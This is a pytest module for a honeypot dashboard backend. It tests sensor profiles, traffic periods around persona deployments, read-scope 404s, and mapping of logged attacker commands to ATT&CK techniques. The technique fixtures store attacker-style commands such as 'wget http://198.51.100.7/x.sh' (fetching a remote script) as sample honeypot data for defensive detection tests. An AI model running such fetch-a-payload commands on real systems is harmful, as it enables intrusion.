"""The per-sensor profile and the honeypot list's described fields. Real ES + Postgres.

Fixture events live under `test-sensor-*` ids and are deleted in try/finally; never
the seed sessions. Cleanup is inline, not an async fixture (see test_persona_deployments).
"""

import uuid
from contextlib import asynccontextmanager
from datetime import UTC, datetime, timedelta
from itertools import pairwise

import httpx
import pytest
from sqlalchemy import delete

from app.config import get_settings
from app.db.models import EvaluationProbeResult, EvaluationRun, PersonaDeployment, SensorChange
from app.db.session import get_session_factory
from app.es.client import get_es
from app.main import app
from app.models.sensor import DayPoint, Described, PeriodOut
from app.services import persona_deployments, sensor_changes, sensors
from app.services.dashboard import list_honeypots
from app.services.evaluation import runs
from tests.test_auth import _token, auth_on  # noqa: F401 - auth_on is a fixture

A, B, C = "test-sensor-a", "test-sensor-b", "test-sensor-c"
NOW = datetime.now(UTC)
OS_RELEASE = 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nNAME="Debian GNU/Linux"\nID=debian\n'


def _client() -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test")


async def _index(honeypot_id: str, protocol: str, count: int, first: datetime) -> None:
    for i in range(count):
        await get_es().index(
            index=get_settings().es_index,
            document={
                "@timestamp": (first + timedelta(hours=i)).isoformat(),
                "honeypot": {"id": honeypot_id, "name": f"name-{honeypot_id}"},
                "network": {"protocol": protocol},
                "destination": {"ip": "10.9.8.7"},
                "session": {"id": f"{honeypot_id}-s{i}"},
            },
            refresh=True,
        )


async def _wipe_es() -> None:
    await get_es().delete_by_query(
        index=get_settings().es_index,
        query={"prefix": {"honeypot.id": "test-sensor-"}},
        refresh=True,
        conflicts="proceed",
    )


async def _wipe_pg() -> None:
    async with get_session_factory()() as db:
        for model in (PersonaDeployment, SensorChange):
            await db.execute(delete(model).where(model.honeypot_id.like("test-sensor-%")))
        await db.commit()


async def _completed_run_with_os(
    honeypot_id: str, value: str, started_at: datetime | None = None
) -> uuid.UUID:
    run_id = uuid.uuid4()
    async with get_session_factory()() as db:
        db.add(
            EvaluationRun(
                id=run_id,
                started_by="unrecorded",
                honeypot_id=honeypot_id,
                status="completed",
                started_at=started_at or NOW - timedelta(hours=1),
                finished_at=NOW,
                agent_model="deterministic-probes@1",
                evaluator_status="unavailable",
                honeypot_fingerprint="sha256:BASE",
                evaluation_config_fingerprint="sha256:CFG",
            )
        )
        await db.flush()
        db.add(
            EvaluationProbeResult(
                run_id=run_id,
                module="agent",
                probe_id="os_release",
                target="cowrie",
                establishes="os.identity",
                value=value,
                fact_status="observed",
                raw_output=value,
            )
        )
        await db.commit()
    return run_id


@asynccontextmanager
async def _fixture():
    """a: 3 ssh + 1 telnet, web-server persona; b: 2 http, an evaluated Debian; c: 1 http, nothing."""
    await _wipe_es()
    await _wipe_pg()
    run_id = None
    try:
        first = NOW - timedelta(days=3)
        await _index(A, "ssh", 3, first)
        await _index(A, "telnet", 1, first + timedelta(hours=10))
        await _index(B, "http", 2, first)
        await _index(C, "http", 1, first)
        await persona_deployments.record(
            [A], "web-server", "sha256:" + "a" * 64, "operator:t", at=NOW - timedelta(days=2)
        )
        await sensor_changes.record(
            A, "rate-limit", "10 per minute", "operator:t", at=NOW - timedelta(days=1)
        )
        run_id = await _completed_run_with_os(B, OS_RELEASE)
        yield
    finally:
        await _wipe_es()
        await _wipe_pg()
        if run_id:
            await runs.delete_run(run_id)


def test_type_lists_protocols_by_count_with_friendly_names() -> None:
    assert sensors.describe_type({"telnet": 1, "ssh": 3}) == Described(
        value="SSH, Telnet", source="observed"
    )
    assert sensors.describe_type({"http": 2}) == Described(value="HTTP", source="observed")
    assert sensors.describe_type({"mqtt": 1}).value == "MQTT"
    assert sensors.describe_type({}) == Described(value="unknown", source="unknown")


@pytest.mark.asyncio
async def test_profile_is_observed_and_the_os_comes_from_the_best_source() -> None:
    async with _fixture():
        a = await sensors.get_profile(A)
        assert a is not None
        assert (a.id, a.name, a.address) == (A, f"name-{A}", "10.9.8.7")
        assert a.protocols == {"ssh": 3, "telnet": 1}
        assert a.type == Described(value="SSH, Telnet", source="observed")
        assert a.os == Described(value="Ubuntu 22.04.4 LTS", source="persona")
        assert a.first_seen < a.last_seen
        assert [d.persona for d in a.deployments] == ["web-server"]
        assert [(c.kind, c.detail) for c in a.changes] == [("rate-limit", "10 per minute")]

        b = await sensors.get_profile(B)
        assert b.type == Described(value="HTTP", source="observed")
        assert b.os == Described(value="Debian", source="evaluation")

        c = await sensors.get_profile(C)
        assert c.os == Described(value="unknown", source="unknown")


@pytest.mark.asyncio
async def test_a_reverted_sensor_falls_back_past_the_persona() -> None:
    async with _fixture():
        await persona_deployments.record([B], persona_deployments.PRE_PERSONA, "d", "operator:t")
        # B's run started an hour ago; the revert is later, so the run no longer describes B.
        assert await sensors.describe_os(B) == Described(value="unknown", source="unknown")


@pytest.mark.asyncio
async def test_an_evaluation_from_before_a_revert_does_not_describe_the_sensor() -> None:
    ubuntu = OS_RELEASE.replace("debian", "ubuntu").replace("Debian GNU/Linux", "Ubuntu")
    run_ids = []
    async with _fixture():
        try:
            await persona_deployments.record(
                [C], "web-server", "d", "operator:t", at=NOW - timedelta(days=2)
            )
            run_ids.append(
                await _completed_run_with_os(C, ubuntu, started_at=NOW - timedelta(days=1))
            )
            assert (await sensors.describe_os(C)).source == "persona"
            await persona_deployments.record(
                [C],
                persona_deployments.PRE_PERSONA,
                "d",
                "operator:t",
                at=NOW - timedelta(hours=12),
            )
            assert await sensors.describe_os(C) == Described(value="unknown", source="unknown")
            run_ids.append(
                await _completed_run_with_os(C, OS_RELEASE, started_at=NOW - timedelta(hours=1))
            )
            assert await sensors.describe_os(C) == Described(value="Debian", source="evaluation")
        finally:
            for run_id in run_ids:
                await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_periods_are_contiguous_and_cut_at_the_deployment_and_the_change() -> None:
    async with _fixture():
        profile = await sensors.get_profile(A)
        spans = profile.periods
        assert [p.persona for p in spans] == ["pre-persona", "web-server", "web-server"]
        assert [p.opened_by for p in spans] == [[], ["persona:web-server"], ["rate-limit"]]
        assert spans[0].start == profile.first_seen
        for before, after in pairwise(spans):
            assert before.end == after.start
        assert spans[-1].end >= profile.last_seen


@pytest.mark.asyncio
async def test_no_events_means_no_profile() -> None:
    assert await sensors.get_profile("test-sensor-nothing-here") is None


@pytest.mark.asyncio
async def test_the_list_describes_each_sensor_and_carries_no_interaction_level() -> None:
    async with _fixture():
        listed = {h.id: h for h in await list_honeypots()}
        assert listed[A].type == Described(value="SSH, Telnet", source="observed")
        assert listed[A].os.source == "persona"
        assert listed[B].type.value == "HTTP"
        assert listed[B].os == Described(value="Debian", source="evaluation")
        assert "interaction_level" not in type(listed[A]).model_fields
        async with _client() as client:
            body = (await client.get("/api/honeypots")).json()
        row = next(h for h in body if h["id"] == A)
        assert "interactionLevel" not in row
        assert row["os"] == {"value": "Ubuntu 22.04.4 LTS", "source": "persona"}


@pytest.mark.asyncio
async def test_the_route_serves_the_profile_and_404s_an_unknown_sensor() -> None:
    async with _fixture(), _client() as client:
        ok = await client.get(f"/api/honeypots/{A}")
        assert ok.status_code == 200
        body = ok.json()
        assert body["type"] == {"value": "SSH, Telnet", "source": "observed"}
        assert body["periods"][1]["openedBy"] == ["persona:web-server"]
        assert body["deployments"][0]["deployedBy"] == "operator:t"
        assert (await client.get("/api/honeypots/test-sensor-nothing-here")).status_code == 404


@pytest.mark.asyncio
async def test_a_sensor_the_caller_may_not_read_is_a_404(auth_on) -> None:  # noqa: F811
    async with _fixture(), _client() as client:
        denied = _token(auth_on, role="viewer", roles={A: "none"})
        response = await client.get(
            f"/api/honeypots/{A}", headers={"Authorization": "Bearer " + denied}
        )
        assert response.status_code == 404
        # Indistinguishable from a sensor that does not exist.
        unknown = await client.get(
            "/api/honeypots/test-sensor-nothing-here",
            headers={"Authorization": "Bearer " + denied},
        )
        assert (unknown.status_code, unknown.json()) == (404, response.json())
        allowed = _token(auth_on, role="viewer", roles={B: "none"})
        response = await client.get(
            f"/api/honeypots/{A}", headers={"Authorization": "Bearer " + allowed}
        )
        assert response.status_code == 200


@pytest.mark.asyncio
async def test_the_list_omits_sensors_the_caller_may_not_read(auth_on) -> None:  # noqa: F811
    async with _fixture(), _client() as client:
        token = _token(auth_on, role="viewer", roles={B: "none"})
        response = await client.get("/api/honeypots", headers={"Authorization": "Bearer " + token})
        ids = {h["id"] for h in response.json()}
        assert A in ids and B not in ids
        everything_denied = _token(auth_on, role="none")
        response = await client.get(
            "/api/honeypots", headers={"Authorization": "Bearer " + everything_denied}
        )
        assert response.json() == []


T = "test-sensor-t"


async def _event(at: datetime, ip: str, protocol: str, session: str, country: str | None) -> None:
    await get_es().index(
        index=get_settings().es_index,
        document={
            "@timestamp": at.isoformat(),
            "honeypot": {"id": T, "name": "traffic"},
            "network": {"protocol": protocol},
            "source": {"ip": ip, **({"country": country} if country else {})},
            "session": {"id": session},
        },
        refresh=True,
    )


@asynccontextmanager
async def _traffic_fixture():
    """Six events: three pre-persona about 3.5 days ago, three under web-server about 12 hours ago."""
    await _wipe_es()
    await _wipe_pg()
    try:
        early, late = NOW - timedelta(days=3.5), NOW - timedelta(hours=12)
        minute = timedelta(minutes=1)
        for at, ip, protocol, session in [
            (early, "1.1.1.1", "ssh", "s1"),
            (early + minute, "1.1.1.1", "ssh", "s1"),
            (early + 2 * minute, "10.1.1.2", "telnet", "s2"),
            (late, "1.1.1.1", "ssh", "s3"),
            (late + minute, "3.3.3.3", "ssh", "s4"),
            (late + 2 * minute, "1.1.1.1", "ssh", "s5"),
        ]:
            await _event(at, ip, protocol, session, "IN" if ip == "1.1.1.1" else None)
        await persona_deployments.record(
            [T], "web-server", "sha256:" + "a" * 64, "operator:t", at=NOW - timedelta(days=2)
        )
        yield
    finally:
        await _wipe_es()
        await _wipe_pg()


@pytest.mark.asyncio
async def test_traffic_has_a_point_for_every_day_including_the_empty_ones() -> None:
    async with _traffic_fixture():
        traffic = await sensors.get_traffic(T, 6)
        assert traffic is not None
        days = [p.day for p in traffic.per_day]
        today = datetime.now(UTC).date()
        # First event is 3.5 days back: the days before it exist, as zeros, back to the window start.
        assert days == [today - timedelta(days=n) for n in range(6, -1, -1)]
        assert sum(p.events for p in traffic.per_day) == 6
        assert traffic.per_day[0] == DayPoint(
            day=today - timedelta(days=6), events=0, sessions=0, sources=0
        )
        assert [p.events for p in traffic.per_day].count(0) >= 3


@pytest.mark.asyncio
async def test_traffic_ranks_sources_and_splits_protocols() -> None:
    async with _traffic_fixture():
        traffic = await sensors.get_traffic(T, 4)
        first = traffic.top_sources[0]
        assert (first.ip, first.country, first.events) == ("1.1.1.1", "IN", 4)
        by_ip = {s.ip: s for s in traffic.top_sources}
        assert (by_ip["10.1.1.2"].country, by_ip["10.1.1.2"].events) == (None, 1)
        assert traffic.protocols == {"ssh": 5, "telnet": 1}


@pytest.mark.asyncio
async def test_traffic_is_split_at_the_deployment_with_rates_over_the_period_length() -> None:
    async with _traffic_fixture():
        traffic = await sensors.get_traffic(T, 4)
        before, after = traffic.periods
        assert (before.period.persona, after.period.persona) == ("pre-persona", "web-server")
        assert (before.events, before.sessions, before.sources) == (3, 2, 2)
        assert (after.events, after.sessions, after.sources) == (3, 3, 2)
        for p in traffic.periods:
            length = (p.period.end - p.period.start).total_seconds() / 86400
            assert p.events_per_day == pytest.approx(p.events / length)
            assert p.sources_per_day == pytest.approx(p.sources / length)
        assert before.events_per_day == pytest.approx(2.0, rel=0.01)  # 3 events over 1.5 days


@pytest.mark.asyncio
async def test_rates_use_the_period_as_clipped_to_the_window() -> None:
    async with _traffic_fixture():
        traffic = await sensors.get_traffic(T, 1)
        (only,) = traffic.periods  # the deployment is two days back, outside the window
        assert only.period.persona == "web-server"
        assert only.events == 3
        assert only.events_per_day == pytest.approx(3, rel=0.01)  # not 3 over the 2-day deployment


@pytest.mark.asyncio
async def test_a_quiet_window_is_zeros_but_a_sensor_without_events_is_none() -> None:
    async with _traffic_fixture():
        traffic = await sensors.get_traffic(T, 1)
        assert traffic is not None
        await _wipe_es()
        await _event(NOW - timedelta(days=60), "9.9.9.9", "ssh", "old", None)
        quiet = await sensors.get_traffic(T, 7)
        assert quiet is not None
        assert (quiet.top_sources, quiet.protocols) == ([], {})
        assert all(p.events == 0 for p in quiet.per_day) and quiet.periods[0].events == 0
    assert await sensors.get_traffic("test-sensor-nothing-here", 7) is None


@pytest.mark.asyncio
async def test_the_traffic_route_bounds_days_and_follows_read_scope(auth_on) -> None:  # noqa: F811
    async with _traffic_fixture(), _client() as client:
        denied = {"Authorization": "Bearer " + _token(auth_on, role="viewer", roles={T: "none"})}
        allowed = {"Authorization": "Bearer " + _token(auth_on, role="viewer", roles={A: "none"})}
        ok = await client.get(f"/api/honeypots/{T}/traffic?days=4", headers=allowed)
        assert ok.status_code == 200
        body = ok.json()
        assert body["topSources"][0]["ip"] == "1.1.1.1"
        assert body["periods"][0]["eventsPerDay"] > 0
        assert (await client.get(f"/api/honeypots/{T}/traffic", headers=allowed)).status_code == 200
        for days in (0, 91):
            response = await client.get(f"/api/honeypots/{T}/traffic?days={days}", headers=allowed)
            assert response.status_code == 422
        assert (await client.get(f"/api/honeypots/{T}/traffic", headers=denied)).status_code == 404
        missing = await client.get(
            "/api/honeypots/test-sensor-nothing-here/traffic", headers=allowed
        )
        assert missing.status_code == 404


@pytest.mark.asyncio
async def test_a_young_sensors_first_period_starts_at_its_first_event() -> None:
    await _wipe_es()
    try:
        first = NOW - timedelta(days=2)
        await _event(first, "1.1.1.1", "ssh", "y1", None)
        await _event(NOW - timedelta(days=1), "1.1.1.1", "ssh", "y2", None)
        young = "test-sensor-y"
        # _event writes T; re-home the two events to the young sensor.
        await get_es().update_by_query(
            index=get_settings().es_index,
            query={"term": {"honeypot.id": T}},
            script={"source": "ctx._source.honeypot.id = params.id", "params": {"id": young}},
            refresh=True,
            conflicts="proceed",
        )
        traffic = await sensors.get_traffic(young, 6)
        assert len(traffic.per_day) >= 7  # the chart keeps the whole window
        (only,) = traffic.periods
        assert abs((only.period.start - first).total_seconds()) < 0.01
        assert only.events == 2
        assert only.events_per_day == pytest.approx(1.0, rel=0.01)  # 2 events over 2 days, not 6
    finally:
        await _wipe_es()


@pytest.mark.asyncio
async def test_period_events_add_up_and_an_event_at_a_deployment_belongs_to_the_new_period() -> (
    None
):
    async with _traffic_fixture():
        at = (NOW - timedelta(days=1)).replace(microsecond=0)  # whole ms, as ES stores it
        await _event(at, "1.1.1.1", "ssh", "edge", None)
        await persona_deployments.record([T], "database", "d", "operator:t", at=at)
        traffic = await sensors.get_traffic(T, 4)
        in_window = sum(p.events for p in traffic.per_day)
        assert in_window == 7 == sum(p.events for p in traffic.periods)
        assert [p.events for p in traffic.periods] == [
            3,
            0,
            4,
        ]  # the boundary event is the new one's


def test_a_sliver_of_a_period_is_floored_at_an_hour() -> None:
    now = datetime.now(UTC)
    sliver = PeriodOut(start=now, end=now + timedelta(minutes=5), persona=None, opened_by=[])
    assert sensors._per_day(3, sliver) == 72


async def _command(
    at: datetime,
    session: str,
    command: str,
    honeypot_id: str = A,
    action: str = "cowrie.command.input",
) -> None:
    await get_es().index(
        index=get_settings().es_index,
        document={
            "@timestamp": at.isoformat(),
            "honeypot": {"id": honeypot_id, "name": "techniques"},
            "event": {"action": action},
            "process": {"command_line": command},
            "session": {"id": session},
        },
        refresh=True,
    )


@asynccontextmanager
async def _technique_fixture():
    """wget x3 (s1 twice before the deployment, s2 once after), uname x2 (one each side), ls x1."""
    await _wipe_es()
    await _wipe_pg()
    try:
        early, late = NOW - timedelta(days=3.5), NOW - timedelta(hours=12)
        minute = timedelta(minutes=1)
        wget = "wget http://198.51.100.7/x.sh"
        for at, session, command in [
            (early, "s1", wget),
            (early + minute, "s1", wget),
            (early + 2 * minute, "s1", "uname -a"),
            (early + 3 * minute, "s1", "ls"),
            (late, "s2", wget),
            (late + minute, "s3", "uname -a"),
        ]:
            await _command(at, session, command)
        # Noise the session count must ignore: a login with no command, the same wget on
        # another sensor, the same wget on this one before the window (days=6), and the
        # same text on an event that is not a command input.
        await _event(early, "1.1.1.1", "ssh", "noise", None)
        await _command(early, "other-sensor", wget, honeypot_id="test-sensor-other")
        await _command(NOW - timedelta(days=10), "before-window", wget)
        await _command(late, "not-a-command", wget, action="cowrie.session.file_download")
        await persona_deployments.record(
            [A], "web-server", "sha256:" + "a" * 64, "operator:t", at=NOW - timedelta(days=2)
        )
        yield
    finally:
        await _wipe_es()
        await _wipe_pg()


@pytest.mark.asyncio
async def test_techniques_come_from_the_rulebook_over_every_distinct_command() -> None:
    async with _technique_fixture():
        result = await sensors.get_techniques(A, 6)
        assert result is not None
        assert (result.days, result.commands_considered, result.truncated) == (6, 3, False)
        by_id = {t.technique_id: t for t in result.techniques}
        assert set(by_id) == {"T1105", "T1082"}  # `ls` matches nothing and adds nothing
        wget = by_id["T1105"]
        # The noise sessions (other sensor, before the window, not a command) are not counted.
        assert (wget.events, wget.sessions, wget.rule_id) == (3, 2, "T1105")
        assert (wget.name, wget.tactic) == ("Ingress Tool Transfer", "Command and Control")
        assert wget.first_seen < wget.last_seen
        uname = by_id["T1082"]
        assert (uname.events, uname.sessions, uname.tactic) == (2, 2, "Discovery")
        assert [t.technique_id for t in result.techniques] == ["T1105", "T1082"]  # events desc


@pytest.mark.asyncio
async def test_techniques_are_split_across_the_deployment_boundary() -> None:
    async with _technique_fixture():
        result = await sensors.get_techniques(A, 6)
        assert [p.persona for p in result.periods] == ["pre-persona", "web-server"]
        by_id = {t.technique_id: t for t in result.techniques}
        assert by_id["T1105"].per_period == [2, 1]
        assert by_id["T1082"].per_period == [1, 1]
        # Clipped to the window like the traffic: only the later period is left.
        (only,) = (await sensors.get_techniques(A, 1)).periods
        assert only.persona == "web-server"


@pytest.mark.asyncio
async def test_a_quiet_window_has_no_techniques_but_an_unknown_sensor_is_none() -> None:
    async with _technique_fixture():
        await _wipe_es()
        await _command(NOW - timedelta(days=60), "old", "uname -a")
        quiet = await sensors.get_techniques(A, 7)
        assert quiet is not None
        assert (quiet.techniques, quiet.commands_considered) == ([], 0)
    assert await sensors.get_techniques("test-sensor-nothing-here", 7) is None


@pytest.mark.asyncio
async def test_truncation_is_reported_and_long_command_lists_are_chunked(monkeypatch) -> None:
    monkeypatch.setattr(sensors, "_MAX_COMMANDS", 2)
    monkeypatch.setattr(sensors, "_TERMS_CHUNK", 1)
    async with _technique_fixture():
        for n in range(3):
            await _command(NOW - timedelta(hours=n + 1), f"w{n}", f"wget http://198.51.100.7/{n}")
        result = await sensors.get_techniques(A, 6)
        assert result.truncated is True
        assert result.commands_considered == 2
        # Chunked into single-term clauses, each technique still counts its sessions.
        assert all(t.sessions >= 1 for t in result.techniques)
        monkeypatch.setattr(sensors, "_MAX_COMMANDS", 50)
        full = await sensors.get_techniques(A, 6)
        assert (full.truncated, full.commands_considered) == (False, 6)
        wget = next(t for t in full.techniques if t.technique_id == "T1105")
        assert (wget.events, wget.sessions) == (6, 5)


@pytest.mark.asyncio
async def test_the_command_cap_shrinks_with_the_period_count(monkeypatch) -> None:
    async with _technique_fixture():
        # Two periods -> three buckets per command, so 6 buckets allow two commands.
        monkeypatch.setattr(sensors, "_MAX_BUCKETS", 6)
        result = await sensors.get_techniques(A, 6)
        assert (result.truncated, result.commands_considered) == (True, 2)
        # The two most frequent commands (wget x3, uname x2) are the ones kept.
        assert {t.technique_id for t in result.techniques} == {"T1105", "T1082"}
        monkeypatch.setattr(sensors, "_MAX_BUCKETS", 3)
        result = await sensors.get_techniques(A, 6)
        assert (result.truncated, result.commands_considered) == (True, 1)
        assert [t.technique_id for t in result.techniques] == ["T1105"]


@pytest.mark.asyncio
async def test_the_techniques_route_bounds_days_and_follows_read_scope(auth_on) -> None:  # noqa: F811
    async with _technique_fixture(), _client() as client:
        denied = {"Authorization": "Bearer " + _token(auth_on, role="viewer", roles={A: "none"})}
        allowed = {"Authorization": "Bearer " + _token(auth_on, role="viewer", roles={B: "none"})}
        ok = await client.get(f"/api/honeypots/{A}/techniques?days=6", headers=allowed)
        assert ok.status_code == 200
        body = ok.json()
        assert body["commandsConsidered"] == 3 and body["truncated"] is False
        assert body["techniques"][0]["techniqueId"] == "T1105"
        assert body["techniques"][0]["perPeriod"] == [2, 1]
        assert (
            await client.get(f"/api/honeypots/{A}/techniques", headers=allowed)
        ).status_code == 200
        for days in (0, 91):
            response = await client.get(
                f"/api/honeypots/{A}/techniques?days={days}", headers=allowed
            )
            assert response.status_code == 422
        assert (
            await client.get(f"/api/honeypots/{A}/techniques", headers=denied)
        ).status_code == 404
        missing = await client.get(
            "/api/honeypots/test-sensor-nothing-here/techniques", headers=allowed
        )
        assert missing.status_code == 404


@pytest.mark.asyncio
async def test_a_deployment_before_the_first_event_drops_the_leading_bucket() -> None:
    """A sensor given a persona, then attacked: the clipped period keeps its own events."""
    await _wipe_es()
    await _wipe_pg()
    try:
        deployed = NOW - timedelta(days=3)
        for sensor in (T, A):
            await persona_deployments.record([sensor], "web-server", "d", "operator:t", at=deployed)
        for hours in (24, 23, 22):
            await _event(NOW - timedelta(hours=hours), "1.1.1.1", "ssh", f"o{hours}", None)
            await _command(NOW - timedelta(hours=hours), f"o{hours}", "uname -a")
        traffic = await sensors.get_traffic(T, 6)
        (only,) = traffic.periods  # the pre-persona bucket before `deployed` is skipped
        assert only.period.persona == "web-server"
        assert only.events == 3 == sum(p.events for p in traffic.per_day)
        techniques = await sensors.get_techniques(A, 6)
        assert [p.persona for p in techniques.periods] == ["web-server"]
        (uname,) = techniques.techniques
        assert uname.per_period == [3]
    finally:
        await _wipe_es()
        await _wipe_pg()
